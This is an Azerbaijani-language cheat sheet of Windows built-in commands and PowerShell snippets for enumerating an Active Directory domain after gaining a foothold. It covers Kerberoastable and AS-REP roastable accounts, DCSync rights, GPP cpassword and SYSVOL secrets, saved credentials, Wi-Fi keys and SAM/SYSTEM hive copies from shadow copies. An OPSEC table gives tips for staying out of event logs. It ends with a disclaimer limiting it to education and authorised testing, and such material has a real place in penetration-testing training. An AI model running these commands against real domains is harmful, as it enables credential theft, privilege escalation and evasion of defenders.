# Active Directory Mühitində Living off the Land (LotL) ilə Maksimum Enumeration

> **Məqsəd:** Xarici alət yükləmədən, yalnız Windows/AD-nin daxili mexanizmlərindən istifadə edərək mühiti tam kəşf etmək.

### Cari istifadəçi və hüquqlar

```cmd
whoami
whoami /all
whoami /groups
whoami /priv
echo %USERNAME%
echo %USERDOMAIN%
echo %LOGONSERVER%
```

### Sistem məlumatı

```cmd
hostname
systeminfo
systeminfo | findstr /B /C:"Domain"
systeminfo | findstr /B /C:"OS"
ipconfig /all
set
```

### Aktiv sessiyalar

```cmd
qwinsta
query session
query user
```

---

## 2. Domain Məlumatları

### Domain adı və DC tapma

```cmd
echo %USERDNSDOMAIN%
echo %LOGONSERVER%
nltest /dclist:%USERDNSDOMAIN%
nltest /dsgetdc:%USERDNSDOMAIN%
nltest /domain_trusts
```

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
```

### Domain Controller IP-ləri

```cmd
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN.LOCAL
nslookup -type=SRV _kerberos._tcp.DOMAIN.LOCAL
```

### Domain Functional Level

```powershell
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domain.DomainMode
$domain.Forest.ForestMode
```

---

## 3. İstifadəçi Enumeration

### Bütün domain istifadəçiləri

```cmd
net user /domain
```

```powershell
# ADSI ilə (modul olmadan)
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=user)"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","distinguishedname","description","memberof","lastlogon","pwdlastset","useraccountcontrol"))
$searcher.PageSize = 1000
$results = $searcher.FindAll()
$results | ForEach-Object { $_.Properties }
```

### Xüsusi istifadəçi məlumatı

```cmd
net user administrator /domain
net user TARGET_USER /domain
```

```powershell
# Qeyri-aktiv istifadəçilər
$searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"

# Şifrəsi heç vaxt expire olmayan istifadəçilər
$searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"

# AdminCount=1 olan istifadəçilər (privileged)
$searcher.Filter = "(&(objectClass=user)(adminCount=1))"
```

### Son logon vaxtı olan istifadəçilər

```powershell
$searcher.Filter = "(&(objectClass=user)(lastLogon>=*))"
$searcher.PropertiesToLoad.Add("lastLogon") | Out-Null
$results = $searcher.FindAll()
$results | ForEach-Object {
    $user = $_.Properties.samaccountname
    $ll = [datetime]::FromFileTime([int64]::Parse($_.Properties.lastlogon[0]))
    "$user : $ll"
}
```

### Description sahəsindəki şifrələr

```powershell
$searcher.Filter = "(&(objectClass=user)(description=*pass*))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","description"))
$searcher.FindAll() | ForEach-Object { $_.Properties }
```

---

## 4. Qrup Enumeration

### Bütün qruplar

```cmd
net group /domain
net localgroup
```

### Privileged qruplar

```cmd
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Schema Admins" /domain
net group "Group Policy Creator Owners" /domain
net group "Domain Controllers" /domain
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"
```

### Qrup üzvlüyü (iç-içə)

```powershell
$searcher.Filter = "(objectClass=group)"
$searcher.PropertiesToLoad.AddRange(@("cn","member","memberof","description","adminCount"))
$searcher.FindAll() | ForEach-Object {
    $name = $_.Properties.cn
    $members = $_.Properties.member
    "$name : $($members -join ', ')"
}
```

### İstifadəçinin bütün qrupları (iç-içə daxil)

```powershell
# Tokengroups atributu ilə
$user = [ADSI]"LDAP://CN=TARGET_USER,CN=Users,DC=domain,DC=local"
$user.GetInfoEx(@("tokengroups"),0)
$groups = $user.Get("tokengroups")
$groups | ForEach-Object {
    $sid = New-Object System.Security.Principal.SecurityIdentifier($_,0)
    $sid.Translate([System.Security.Principal.NTAccount])
}
```

---

## 5. Kompüter Enumeration

### Bütün domain kompüterləri

```cmd
net group "Domain Computers" /domain
```

```powershell
$searcher.Filter = "(objectClass=computer)"
$searcher.PropertiesToLoad.AddRange(@("name","operatingsystem","operatingsystemversion","dnshostname","lastlogon","description"))
$searcher.PageSize = 1000
$results = $searcher.FindAll()
$results | ForEach-Object {
    [PSCustomObject]@{
        Name    = $_.Properties.name[0]
        OS      = $_.Properties.operatingsystem
        Version = $_.Properties.operatingsystemversion
        DNS     = $_.Properties.dnshostname
    }
}
```

### Server-ləri filtrləmək

```powershell
$searcher.Filter = "(&(objectClass=computer)(operatingsystem=*server*))"
```

### Domain Controller-lər

```powershell
$searcher.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
```

### Köhnə OS-lər (juicy targets)

```powershell
$searcher.Filter = "(&(objectClass=computer)(|(operatingsystem=*XP*)(operatingsystem=*2003*)(operatingsystem=*Vista*)(operatingsystem=*2008*)))"
```

---

## 6. GPO və OU Enumeration

### OU strukturu

```powershell
$searcher.Filter = "(objectClass=organizationalUnit)"
$searcher.PropertiesToLoad.AddRange(@("name","distinguishedname","gplink"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        OU    = $_.Properties.name[0]
        DN    = $_.Properties.distinguishedname[0]
        GPLink = $_.Properties.gplink
    }
}
```

### GPO-lar

```powershell
$searcher.Filter = "(objectClass=groupPolicyContainer)"
$searcher.PropertiesToLoad.AddRange(@("displayname","gpcfilesyspath","distinguishedname"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Name = $_.Properties.displayname[0]
        Path = $_.Properties.gpcfilesyspath[0]
        DN   = $_.Properties.distinguishedname[0]
    }
}
```

### GPO fayllarını oxumaq (SYSVOL)

```cmd
dir \\DOMAIN\SYSVOL\DOMAIN\Policies\ /s
type \\DOMAIN\SYSVOL\DOMAIN\Policies\{GPO-GUID}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

```powershell
# SYSVOL-da credentials axtarmaq
Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|cpassword|pwd" -ErrorAction SilentlyContinue
```

### GPP Cpassword (MS14-025)

```cmd
findstr /S /I cpassword \\DOMAIN\SYSVOL\DOMAIN\Policies\*.xml
```

---

## 7. Trust və Forest Enumeration

### Domain Trust-ları

```cmd
nltest /domain_trusts /all_trusts
nltest /trusted_domains
```

```powershell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

### LDAP ilə Trust

```powershell
$searcher.Filter = "(objectClass=trustedDomain)"
$searcher.PropertiesToLoad.AddRange(@("name","trusttype","trustdirection","trustattributes"))
$searcher.FindAll() | ForEach-Object { $_.Properties }
```

**Trust Direction Dəyərləri:**
| Dəyər | Mənası |
|-------|--------|
| 1 | Inbound (onlar bizə güvənir) |
| 2 | Outbound (biz onlara güvənirik) |
| 3 | Bidirectional |

---

## 8. ACL və Hüquq Enumeration

### AD obyektləri üzərindəki ACL-lər

```powershell
# Domain obyektinin ACL-i
$acl = Get-Acl "AD:DC=domain,DC=local"
$acl.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|WriteProperty|GenericWrite" }
```

### Spesifik istifadəçinin ACL hüquqları

```powershell
$targetDN = "CN=TARGET_USER,CN=Users,DC=domain,DC=local"
$acl = Get-Acl "AD:$targetDN"
$acl.Access | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType
```

### AdminSDHolder ACL

```powershell
$acl = Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=domain,DC=local"
$acl.Access | Where-Object { $_.IdentityReference -notmatch "SYSTEM|Domain Admins|Enterprise Admins" }
```

### DCSync hüquqları olan istifadəçilər

```powershell
# Replicating Directory Changes hüququ
$acl = Get-Acl "AD:DC=domain,DC=local"
$acl.Access | Where-Object {
    $_.ObjectType -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
}
```

---

## 9. Kerberos və SPN Enumeration

### Kerberoastable hesablar (SPN-ı olan)

```powershell
$searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","distinguishedname","admincount"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        User = $_.Properties.samaccountname[0]
        SPN  = $_.Properties.serviceprincipalname
        Admin = $_.Properties.admincount
    }
}
```

### AS-REP Roastable (Kerberos Pre-auth yoxdur)

```powershell
$searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","useraccountcontrol"))
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }
```

### Kerberos ticket-ləri (lokal)

```cmd
klist
klist tgt
klist tickets
```

### TGT almaq (native)

```cmd
# Windows built-in
Runas /netonly /user:DOMAIN\user cmd
```

---

## 10. Şəbəkə və DNS Enumeration

### Şəbəkə interfeyslər

```cmd
ipconfig /all
route print
arp -a
netstat -ano
netstat -anob
```

### DNS sorğular

```cmd
nslookup DOMAIN.LOCAL
nslookup -type=MX DOMAIN.LOCAL
nslookup -type=NS DOMAIN.LOCAL
nslookup -type=SRV _ldap._tcp.DOMAIN.LOCAL
```

```powershell
# DNS Zone Transfer (əgər icazə varsa)
Resolve-DnsName -Name DOMAIN.LOCAL -Type AXFR -Server DC_IP
```

### Hosts faylı

```cmd
type C:\Windows\System32\drivers\etc\hosts
type C:\Windows\System32\drivers\etc\networks
```

### Açıq portlar (lokal)

```cmd
netstat -ano | findstr LISTENING
netstat -ano | findstr ESTABLISHED
```

### Ping sweep (PowerShell ilə)

```powershell
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
        Write-Output "$ip is UP"
    }
}
```

---

## 11. Paylaşılan Qovluqlar və SMB

### Lokal paylaşımlar

```cmd
net share
```

### Domain kompüterlərindəki paylaşımlar

```cmd
net view \\TARGET_HOST
net view \\TARGET_HOST /all
net use \\TARGET_HOST\IPC$ "" /u:""
```

### Bütün domain-də paylaşımları tapmaq

```powershell
$computers = (New-Object System.DirectoryServices.DirectorySearcher("(objectClass=computer)")).FindAll()
$computers | ForEach-Object {
    $name = $_.Properties.name[0]
    Try {
        $shares = net view \\$name 2>$null
        if ($shares) { Write-Output "$name : $shares" }
    } Catch {}
}
```

### Yazıla bilən paylaşımları yoxlamaq

```powershell
$path = "\\SERVER\SHARE"
$testFile = "$path\test_$(Get-Random).tmp"
Try {
    [io.file]::WriteAllText($testFile, "test")
    Write-Output "Writable: $path"
    Remove-Item $testFile
} Catch { Write-Output "Not writable: $path" }
```

---

## 12. LDAP ilə Sorğular

### LDAP root DSE

```powershell
$root = [ADSI]"LDAP://RootDSE"
$root.defaultNamingContext
$root.configurationNamingContext
$root.schemaNamingContext
$root.rootDomainNamingContext
$root.supportedLDAPVersion
$root.supportedSASLMechanisms
```

### Schema enumeration

```powershell
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Schema,CN=Configuration,DC=domain,DC=local")
$searcher.Filter = "(objectClass=classSchema)"
$searcher.PropertiesToLoad.Add("ldapdisplayname") | Out-Null
$searcher.FindAll() | ForEach-Object { $_.Properties.ldapdisplayname }
```

### LDAP sorğusu strukturu

```
(&(objectClass=user)(samaccountname=admin*))
(|(objectClass=user)(objectClass=computer))
(&(objectClass=group)(cn=*admin*))
```

---

## 13. PowerShell AD Module

> AD modulu quraşdırılmadan da bəzi hallarda istifadə etmək mümkündür.

### RSAT olmadan AD module yükləmək

```powershell
# Əgər DC-də quraşdırılıbsa, import etmək
Import-Module ActiveDirectory -ErrorAction SilentlyContinue

# Yoxsa DLL-i manual yükləmək
Import-Module \\DC\C$\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\*\Microsoft.ActiveDirectory.Management.dll
```

### Modul varsa sürətli enumeration

```powershell
Get-ADDomain
Get-ADForest
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter * -Properties *
Get-ADComputer -Filter * -Properties *
Get-ADGroupMember "Domain Admins" -Recursive
Get-ADDomainController -Filter *
Get-ADTrust -Filter *
Get-ADGPO -All
Get-ADOrganizationalUnit -Filter *
```

---

## 14. WMI ilə Enumeration

### Lokal sistem məlumatı

```cmd
wmic os get Caption,CSDVersion,OSArchitecture,Version
wmic computersystem get Name,Domain,Manufacturer,Model
wmic useraccount list full
wmic group list full
wmic logicaldisk get DeviceID,FreeSpace,Size,VolumeName
```

### Uzaq sistem (əgər icazə varsa)

```cmd
wmic /node:TARGET_IP computersystem get Name,Domain
wmic /node:TARGET_IP process list brief
wmic /node:TARGET_IP service list brief
wmic /node:TARGET_IP useraccount list full
```

### PowerShell ilə WMI

```powershell
Get-WmiObject -Class Win32_ComputerSystem
Get-WmiObject -Class Win32_UserAccount
Get-WmiObject -Class Win32_Group
Get-WmiObject -Class Win32_LoggedOnUser
Get-WmiObject -Class Win32_Process | Select-Object Name,ProcessId,CommandLine
Get-WmiObject -Class Win32_Service | Where-Object { $_.State -eq "Running" }

# Uzaq
Get-WmiObject -Class Win32_ComputerSystem -ComputerName TARGET_IP
```

---

## 15. Scheduled Tasks və Servisler

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo CSV /v > tasks.csv
```

```powershell
Get-ScheduledTask | Select-Object TaskName,TaskPath,State
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $action = $task.Actions
    [PSCustomObject]@{
        Name    = $task.TaskName
        Path    = $task.TaskPath
        Execute = $action.Execute
        Args    = $action.Arguments
        RunAs   = $task.Principal.UserId
    }
}
```

### Servisler

```cmd
sc query
sc query type= all state= all
net start
```

```powershell
Get-Service | Where-Object { $_.Status -eq "Running" }

# Zəif icazəli servis konfiqurasiyon faylları
Get-WmiObject Win32_Service | Select-Object Name,StartName,PathName |
    Where-Object { $_.StartName -ne "LocalSystem" -and $_.StartName -ne "NT AUTHORITY\*" }
```

---

## 16. Registry Enumeration

### AutoRun açarları

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

### Quraşdırılmış proqramlar

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
```

### WinLogon məlumatı

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Lokal Policy

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
```

### Putty saved sessions (credential hunting)

```cmd
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
```

### Proxy məlumatları

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

---

## 17. Credential Hunting

### Faylarda credential axtarmaq

```cmd
dir /s /b *pass* *cred* *vnc* *.config* 2>nul
findstr /si password *.xml *.ini *.txt *.config
findstr /si "password" C:\*.xml C:\*.ini C:\*.txt 2>nul
```

### Unattended quraşdırma faylları

```cmd
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\Windows\system32\sysprep.inf
type C:\sysprep.inf
type C:\sysprep\sysprep.xml
```

### IIS konfiqurasiya

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\inetpub\wwwroot\web.config
dir /s web.config 2>nul
```

### PowerShell history

```powershell
$histPath = (Get-PSReadlineOption).HistorySavePath
Get-Content $histPath
# Adətən: C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Credential Manager

```cmd
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all
```

### DPAPI ilə şifrələnmiş məlumatlar

```powershell
Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\Users\*\AppData\Local\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
```

### WiFi şifrələri (əgər varsa)

```cmd
netsh wlan show profiles
netsh wlan show profile name="WIFI_NAME" key=clear
```

### SAM / SYSTEM faylları (Volume Shadow Copy)

```cmd
vssadmin list shadows
# Shadow copy varsa:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

---

## OPSEC Qeydlər

| Risk | Tövsiyə |
|------|---------|
| `net user /domain` — Kerberos ticket yaradır | LDAP sorğusu daha sakit |
| WMI sorğuları — Event ID 4688 yaradır | PowerShell `-WindowStyle Hidden` istifadə et |
| LDAP axtarışı — LDAP monitoring varsa görünür | Sorgular kiçik hissələrə böl |
| `nltest` — Event ID 4776 yarada bilər | Az istifadə et |
| Kerberoasting — 4769 Event yaranır | Encryption type RC4-HMAC-MD5 az nəzər çəkir |
| PowerShell — ScriptBlock logging — 4104 | `$null = ...` kimi sakitmiz üsullar |
| Net commands — yüksək səs-küylü | ADSI/LDAP metodu seç |

### Event ID-ləri bil

| Event ID | Məna |
|----------|------|
| 4624 | Uğurlu logon |
| 4625 | Uğursuz logon |
| 4634 | Logoff |
| 4688 | Yeni proses yaradıldı |
| 4720 | İstifadəçi hesabı yaradıldı |
| 4728/4732/4756 | Qrupa üzv əlavə edildi |
| 4769 | Kerberos Service Ticket sorğusu |
| 4776 | NTLM credential doğrulama |
| 7045 | Yeni servis quraşdırıldı |

---

## Sürətli Başlanğıc Siyahısı

```powershell
# 1. Kim olduğumu öyrən
whoami /all; $env:LOGONSERVER; $env:USERDNSDOMAIN

# 2. Domain məlumatları
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
nltest /dclist:$env:USERDNSDOMAIN

# 3. ADSI Searcher hazırla
$s = New-Object System.DirectoryServices.DirectorySearcher
$s.PageSize = 1000

# 4. Domain Admins
$s.Filter = "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local))"
$s.FindAll() | %{$_.Properties.samaccountname}

# 5. Kerberoastable
$s.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
$s.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname"))
$s.FindAll() | %{"$($_.Properties.samaccountname) : $($_.Properties.serviceprincipalname)"}

# 6. AS-REP Roastable
$s.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$s.FindAll() | %{$_.Properties.samaccountname}

# 7. Trustlar
nltest /domain_trusts /all_trusts

# 8. Paylaşımlar
net share; net view \\$env:LOGONSERVER
```

---

*Bu sənəd yalnız təhsil və penetration testing məqsədləri üçün hazırlanmışdır. İcazəsiz sistemlərə tətbiq qanunsuz sayılır.*
